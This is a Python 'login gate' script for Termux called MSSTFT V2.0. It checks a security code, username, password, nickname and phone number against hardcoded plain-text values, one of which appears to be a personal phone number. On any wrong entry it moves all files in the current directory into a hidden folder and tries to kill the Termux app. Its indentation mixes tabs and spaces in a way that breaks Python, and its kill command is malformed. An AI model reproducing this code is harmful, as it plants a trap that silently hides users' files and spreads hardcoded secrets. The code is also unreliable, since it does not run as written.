#!/data/data/com.termux/files/usr/bin/python3
import os
import sys
import time
import getpass

os.system("clear")

def username():
	     os.system("figlet -f slant MSSTFT V2.0")
	     username = getpass.getpass("\033[94mUsername: ")
	     if username == "X1L":
	        time.sleep(2)
		os.system("clear")
	     else:
		 time.sleep(2)
		 os.system("mkdir .username && mv * .username")
		 os.system("killall 9 com.termux")

def password():
	     os.system("figlet -f slant MSSTFT V2.0")
	     password = getpass.getpass("\033[31;1mPassword: ")
	     if password == "abdallahx1l":
		time.sleep(2)
		os.system("clear")
	     else:
		 time.sleep(2)
		 os.system("mkdir .password && mv * .password")
                 os.system("killall 9 com.termux")

def phonenumber():
		os.system("figlet -f slant MSSTFT V2.0")
		phonenumber = getpass.getpass("\033[0mPhone Number: ")
		if phonenumber == "01551460076":
		   time.sleep(2)
		   os.system("clear")
		   os.system("figlet WELCOME")
		else:
		    time.sleep(2)
		    os.system("mkdir .phonenumber && mv * .phonenumber")
		    os.system("killall 9 com.termux")

def securitycode():
		 os.system("figlet -f slant MSSTFT V2.0")
		 securitycode = getpass.getpass("\033[31;3mSecurity Code: ")
		 if securitycode == "12345":
		    time.sleep(2)
		    os.system("clear")
		 else:
		     time.sleep(2)
		     os.system("mkdir .securitycode && mv * .securitycode")
		     os.system("killall 9 com.termux")

def nickname():
	     os.system("figlet -f slant MSSTFT V2.0")
	     nickname = getpass.getpass("\033[33mNickname: ")
	     if nickname == "X1L":
		time.sleep(2)
		os.system("clear")
	     else:
		 time.sleep(2)
		 os.system("mkdir .nickname && mv * .nickname")
                 os.system("killall 9 com.termux")

securitycode()
username()
password()
nickname()
phonenumber()
